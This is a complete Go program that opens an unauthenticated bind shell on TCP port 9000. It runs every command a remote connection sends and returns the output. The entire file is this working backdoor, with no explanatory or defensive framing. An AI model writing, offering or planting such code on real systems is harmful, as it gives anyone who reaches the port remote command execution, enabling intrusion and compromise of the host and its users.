package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
)

const (
	bind_port = 9000
)

func main() {
	fmt.Printf("attempting to create bind shell on port %d\n", bind_port)
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", bind_port))
	if err != nil {
		fmt.Printf("error occurred while creating the listener\n\t%s\n", err.Error())
		return
	}

	fmt.Printf("listener created, waiting for connections...\n")
	for {
		incomingConn, err := listener.Accept()
		if err != nil {
			fmt.Printf("error occurred while accept the connection\n\t%s\n", err.Error())
			return
		}

		fmt.Printf("connection from %s received\n", incomingConn.RemoteAddr().String())
		go handleShellConnection(incomingConn)
	}
}

func handleShellConnection(incomingConn net.Conn) {
	incomingConn.Write([]byte("WARNING: only non-interactive commands are supported.\n"))
	for {
		var buffer bytes.Buffer
		// read from the connection until we hit a newline
		remoteUserCmd, err := bufio.NewReader(incomingConn).ReadString('\n')
		if err != nil {
			if err == io.EOF {
				fmt.Printf("connection closed\n")
				return
			}
			fmt.Printf("error occurred while reading data from the connection\n\t%s\n", err.Error())
			return
		}

		// make sure we have the shorted command
		remoteUserCmd = strings.Trim(remoteUserCmd, "\r\n")
		fmt.Printf("\treceived cmd: %s\n", remoteUserCmd)
		cmdComponents := strings.Split(remoteUserCmd, " ")
		var cmd *exec.Cmd
		if len(cmdComponents) > 1 {
			cmd = exec.Command(cmdComponents[0], cmdComponents[1:]...)
		} else {
			cmd = exec.Command(remoteUserCmd)
		}
		cmd.Stdout = &buffer
		cmd.Stderr = &buffer
		cmd.Run()
		incomingConn.Write(buffer.Bytes())
	}
}
